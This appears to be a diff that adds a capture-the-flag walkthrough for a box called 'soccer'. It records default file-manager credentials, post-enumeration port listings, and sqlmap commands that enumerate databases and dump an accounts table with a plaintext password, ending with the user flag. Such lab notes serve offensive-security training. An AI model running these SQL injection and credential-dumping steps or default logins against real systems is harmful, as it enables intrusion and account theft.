@@ -1,0 +1,47 @@
+# /tiny login
+admin:admin@123
+
+
+# post enum
+tcp        0      0 0.0.0.0:9091            0.0.0.0:*               LISTEN      -                                                                                                           
+tcp        0      0 127.0.0.1:33060         0.0.0.0:*               LISTEN      -                   
+tcp        0      0 127.0.0.1:3306          0.0.0.0:*               LISTEN      -                   
+tcp        0      0 0.0.0.0:80              0.0.0.0:*               LISTEN      1036/nginx: worker  
+tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN      -                   
+tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -                   
+tcp        0      0 127.0.0.1:3000          0.0.0.0:*               LISTEN      -                   
+tcp6       0      0 :::80                   :::*                    LISTEN      1036/nginx: worker  
+tcp6       0      0 :::22                   :::*                    LISTEN      -          
+
+
+# sql injection ref
+https://rayhan0x01.github.io/ctf/2021/04/02/blind-sqli-over-websocket-automation.html
+
+# SQLi
+sqlmap -u "http://127.0.0.1:9091/?id=1" --batch -dbs
+available databases [5]:
+[*] information_schema
+[*] mysql
+[*] performance_schema
+[*] soccer_db
+[*] sys
+
+sqlmap -u "http://127.0.0.1:9091/?id=1" -D soccer_db --columns
+Database: soccer_db
+[1 table]
++----------+
+| accounts |
++----------+
+
+sqlmap -u "http://127.0.0.1:9091/?id=1" -D soccer_db -T accounts -C username,password --dump
++----------+----------------------+
+| username | password             |
++----------+----------------------+
+| player   | PlayerOftheMatch2022 |
++----------+----------------------+
+
+# user.txt
+player@soccer:~$ cat user.txt 
+cdb65cabfe74936ea87631b015170f73
+
+#
